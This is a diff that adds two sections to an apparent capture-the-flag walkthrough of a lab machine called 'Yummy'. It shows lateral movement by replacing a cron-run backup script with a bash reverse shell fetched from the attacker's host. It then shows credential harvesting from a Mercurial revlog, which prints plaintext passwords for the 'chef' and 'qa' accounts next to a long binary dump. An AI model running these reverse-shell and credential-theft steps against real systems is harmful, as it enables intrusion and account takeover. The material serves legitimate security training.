@@ -604,3 +604,175 @@ id
 uid=110(mysql) gid=110(mysql) groups=110(mysql)
 mysql@yummy:/var/spool/cron$
 ```
+
+## 6. Lateral movement to `www-data`
+
+Recall again on `/etc/crontab`, the `app_backup.sh` is run by `www-data` every minute as well, let's get it to run a reverse shell
+
+Prepare reverse shell script in Apache:
+
+```sh
+cat << EOF > /var/www/html/rev2.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.20/4445 0>&1
+EOF
+```
+
+Start listener in Kali
+
+```sh
+rlwrap nc -nlvp 4445
+```
+
+```console
+mysql@yummy:/var/spool/cron$ cd /data/scripts
+cd /data/scripts
+mysql@yummy:/data/scripts$ mv app_backup.sh app_backup.sh.bak
+mv app_backup.sh app_backup.sh.bak
+mysql@yummy:/data/scripts$ curl -sLo app_backup.sh 10.10.14.20/rev2.sh
+curl -sLo app_backup.sh 10.10.14.20/rev2.sh
+mysql@yummy:/data/scripts$ ls -l
+ls -l
+total 28
+-rw-rw-r-- 1 mysql mysql   54 Jan 11 08:02 app_backup.sh
+-rw-r--r-- 1 root  root    90 Sep 26 15:31 app_backup.sh.bak
+-rw-r--r-- 1 root  root  1336 Sep 26 15:31 dbmonitor.sh
+-rw-r----- 1 root  root    60 Jan 11 08:00 fixer-v1.0.1.sh
+-rw-r--r-- 1 root  root  5570 Sep 26 15:31 sqlappointments.sql
+-rw-r--r-- 1 root  root   114 Sep 26 15:31 table_cleanup.sh
+```
+
+> [!Tip]
+> 
+> The Apache logs would show when the target retrieve the reverse shell script, this can be useful for troubleshooting:
+> 
+> ```console
+> root@kali:~# tail -f /var/log/apache2/access.log
+> 10.10.11.36 - - [11/Jan/2025:16:06:33 +0800] "GET /rev.sh HTTP/1.1" 200 281 "-" "curl/8.5.0"
+> 10.10.11.36 - - [11/Jan/2025:16:18:11 +0800] "GET /rev2.sh HTTP/1.1" 200 281 "-" "curl/8.5.0"
+> ```
+
+Reverse shell hooked:
+
+```console
+connect to [10.10.14.20] from (UNKNOWN) [10.10.11.36] 59168
+bash: cannot set terminal process group (26604): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@yummy:/root$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+You have new mail in /var/mail/www-data
+```
+
+## 7. Lateral movement to `qa`
+
+Searching for `password` in files under `www-data`'s home directory at `/var/www` reveals there may be something interesting in `/var/www/app-qatesting/.hg/store/data/app.py.i`
+
+```console
+www-data@yummy:/root$ cd ~
+cd ~
+www-data@yummy:~$ pwd
+pwd
+/var/www
+www-data@yummy:~$ grep -r password .
+grep -r password .
+./app-qatesting/app.py:    'password': '3wDo7gSRZIwIHRxZ!',
+./app-qatesting/app.py:        password = request.json.get('password')
+./app-qatesting/app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
+./app-qatesting/app.py:        if not email or not password:
+./app-qatesting/app.py:            return jsonify(message="email or password is missing"), 400
+./app-qatesting/app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
+./app-qatesting/app.py:                cursor.execute(sql, (email, password2))
+./app-qatesting/app.py:                    return jsonify(message="Invalid email or password"), 401
+./app-qatesting/app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
+./app-qatesting/app.py:            if not email or not password:
+./app-qatesting/app.py:                return jsonify(error="email or password is missing"), 400
+./app-qatesting/app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
+./app-qatesting/app.py:                        cursor.execute(sql, (email, password, role_id))
+./app-qatesting/config/signature.py:    password=None,
+grep: ./app-qatesting/config/__pycache__/signature.cpython-311.pyc: binary file matches
+grep: ./app-qatesting/config/__pycache__/signature.cpython-312.pyc: binary file matches
+./app-qatesting/templates/register.html:                    <label for="password">Password:</label>
+./app-qatesting/templates/register.html:                    <input type="password" id="password" name="password">
+./app-qatesting/templates/register.html:                password: document.getElementById("password").value
+./app-qatesting/templates/login.html:                <label for="password">Password:</label>
+./app-qatesting/templates/login.html:                <input type="password" id="password" name="password">
+./app-qatesting/templates/login.html:                password: document.getElementById("password").value
+grep: ./app-qatesting/.hg/wcache/checkisexec: Permission denied
+grep: ./app-qatesting/.hg/store/data/app.py.i: binary file matches
+```
+
+Credentials found: `qa` / `jPAd!XQCtn8Oc@2B`
+
+```console
+www-data@yummy:~$ cat ./app-qatesting/.hg/store/data/app.py.i
+cat ./app-qatesting/.hg/store/data/app.py.i
+        �!_��������qn�l��*��!�E�K�0v�K(�/�`_ MOj_ +�=L�3R�␦�Zk�
+��QL���{2�d\WQP] ���d��|(^����7�o�h�忩[���U[��=���!�~�33��R"�,�.Ah�z�x�����R�_�Y֓nS��s�Ч����
+                                                                                            C�S������Z:L*"��}Z�ַ��&�_�
+                                                                                                                      e��4�I�ևz�^x�U�~$$�{pn��3F9]�"�lG��#o�0�6�(rN[9��N��|��oGf�[I���z��+=q�@����Mj�Bpڊ�}��x{R��c��O��Q��[U�(�0����i��`ɤ"B�DL$Pb2a��AV�����σ��f��Y���8���eO>�qZ+�G�?�+�Ũ��[~�$y6��0�<2�5�P��ښD$,L���,"p�<�LD$
+                                                           ��k+�rv��G�R�d�j�A��B[�T�yغtm�>]*+E5�GM{b�W�����pD%۪^,&9�5���~�:��sX��N�����0�
+Uj�dx��2gU����[��T�p{cI��D�v�S�TH��""����v;;IQy_f��ֺ��
+                                                      ���
+                                                         Z����Y.���}�]�V�V�뜳��
+D9����Ook2`��BĀ
+               �������n�c�����b�I���h67�e��x����x<
+                                                  <n���E�#���e�ZR��
+                                                                   I�iZ ��Z,U�4M�,␦f��_���$2�A��>=�_␦2��)S�w�
+�@��}ޣk�c��p�h�Q�>��S���O#qP8&8`tL�ȧ�и�;Y畝<��{s{���a��惜-�?�+��Q-���T�G��<X�X�1*k��cc�w��fC�!tÆC*0T�:e�*�
+                                   G� {�E��[[=�2�m�Bl�)�        (ea�%��`�(I� �
+                                                                              C�� B@��!��⇯��ǚ��tVd���L��y=��I���X�Rm������7dp���a`�-��!�E=Y-;���Fv�F�M[
+                                                                                                                                                       �p�n�� "Ѻ�R��Ҟ␦��ƣ� �9�Ko␦�<0e�,�$�|%��2��� F�]@��lOi��v7>�����Cz���@�XB����ﷃb[�]w_϶�ۗ��^���`d30�BD��6�$����x�5
+                                                      f�Z#=��$��\]x��i�>�ri��V��I����␦��        .��̆��������Ͼ(�u��V�m���<V����i�����p�7:C)c�|�ßU���Pg�B�Qi�!�p[+��E�����M�}v␦Z�i����ÏN��o.65��_���ȅd
+��+?�8��51����$T���#b�TU��G;<*␦mu�_�CA�q��-��ʫ��7�%!�X���"�:�ѡ�UK���n2�f�������3���L�?�:�T�����T�)`��/.��D��
+                                                                                                            t��w��n�V����2��q�C�|(��^}�*�F�z�r�䣸,=11)CJ}��D�nVE}���`�\���4�9óv�A�A�W��%�JN���·"���*���g�n�G�␦�������qZ,ᨚ��F�'.G����<3�ZP]N�6���qT�\�!>�K\_��<�M�+�x�␦��N���1D
+M�4���p~%+!�2�M�S�H�چ7����8�    r6p�0���T+Z`[(_��樬�Z�3�
+                     V��2
+D�~e�FC0���9C�lN������Z�y���j�5����њph��v8�     ��
+���x�L��ŵb6fX��l~÷�Ѩx�R��`xlS�����                ��zȜa:��MlM���!�
+                                  �dחFl�ћ���D�1���R[#���*�a�t�kգ�?,\����0G'W�#T�a��8����}T�Q��6�ϛ�3�y�*�xǅV     ���C/��6��L�6_�
+                                                                                                                               3�������������b��|�50;�@�ZD8H1ƙCVO���]�␦��1wG��6��%گ0�:�wԿ�Y��Ffa]�F�fM���X4$`ģ� 旟��{�ek�Sg����&�D7h�rv��H��D��4bHQ�    �,���cȯ=b�s�^��Z
+                                                        �c␦��-�A�����-��
+                                                                        �H�:�3A��t�R� r�����UO:H/��ޚr��t�q0�]������L��F�f�.*��m��Jb
+        b����;��\����f{A���#pz�m}�t�äEG�4ת��Z�b                                                                                    ��Ά�6���    ]�J�<-?ј|�
+                                               ���=
+                                                   z��Nk�"?     ��(������ 0���W�!���8�j�kE��(�/�`bm7piL�����*�.H��n�{�&i�K�ϔ�y���!a�$�%w���x#@
+                                                                                                                                              E�\_`��
+�Au��,�z�e����ߡ��kL�=����IH�(Z~�M~}{�'�F�,^
+���K�^�9��up��`%�d!Q0��z[���}9�z�Q�w8 %��6^$�@���2Y�RNG�A�����q��67*o�5=�)�ռ㆏[N����<�jl&�0      ��Y=[�`�,
+                                                                                                         ��a�a*1^�;;w�>~��<��1���)�clR1��=SѺ5���JHR��4-k:EE�O�x�9��s�!˲�����q��w^o������� �'���$�ۈ�e��Y�A���!1�@&ɸxi��%3##�0�@f�e��3N�4K�[
+��
+rB�HI 'DQkX�ըtvGq�a�g�la:ׄ^�B[$�9�u�(���6�U,ݱB�Q#ܱ����:U
+                                                        �H,�W␦��q       �ZaTb���A����ʠ���$�%*�����)T�1���}����|����D��LT��vD��Y>$-@��a��W��,�SI
+                                                                                                                                               k�׊%ݛ
+                                                                                                                                                    ��|YC^,2���
+                                                                                                                                                               l�&�����8Q7���6�����:U�,貽#0�0�V�įz�*�QM�J�
+
+¶)q����e���%Ш��ab�^�
+c�(�/� �m��#)�� ϳ�m۶���C�O�6W�t[QRpn@/S��N����^d�
+x�(�������                                       ���)|Lr:�c,�W�Vz�SDN�Z�/Jb|�%n8��`&^M����IG�:1t�n�����)}���K���>odyٿ$՘|��h�    4�զ�    A#�g�à`�+�j�0����d�|
+�A�(*
+     �f�
+       E1(�/� ��$�&'app.secret_key = s.token_hex(32)
+&u'cT sql = f"SELECT * FROM appointments WHERE_email LIKE %s"
+�ɕp=��E(������##md5�P�����+v�Kw9    'user': 'chef',
+    'password': '3wDo7gSRZIwIHRxZ!',
+EJ*������uY�0��+2ܩ-]%���(�(�/�`O
+�<.`������6�߽��}�v�v�@P��D�2ӕ�_␦B�Mu;G
+                                      �.-1
+                                          ��D�  �kk��Y益H���ΣVps
+                                                                �K�a�0�VW��;h�������B�
+                                                                                      ;ó~z�q�{�+>=�O_�q6� �"V˺&f�*�T㔇D��퍂��@��V([Q���������̋G��φ����>GQ$
+�D��,3�eJoH|j�)�(𶠀yh]��6����~Z�[hY�
+                                    �   �w�4L
+{��]�ߚ�D������fJ�:�����s)�����}              �3�ZШ�݆{S?�m��*H�چ���V3�Y�(��]���
+ ��L��S�eE��6K�6    'user': 'qa',
+    'password': 'jPAd!XQCtn8Oc@2B',
+&E&�&�'#'�'�
+�0+,0*d ����$4�p�"��_���6�.(�/�`�5      �P8*p�c����g� kwJj��*�zӦ9$՚��N;�Z�U�
+    ĉ��D����P�*˅��\Q��]+'¤�2,%��-��Y��
+                                      Ąb�,��d[I})u�␦�r��}�X�����F��K>
+                                                                     +␦��@t���k� 9��j��0�04�k��+�O�h���׷
+Y
+�d�|�p$ JJKx8�D'<a��Z���byh�U�v�]�      
+```
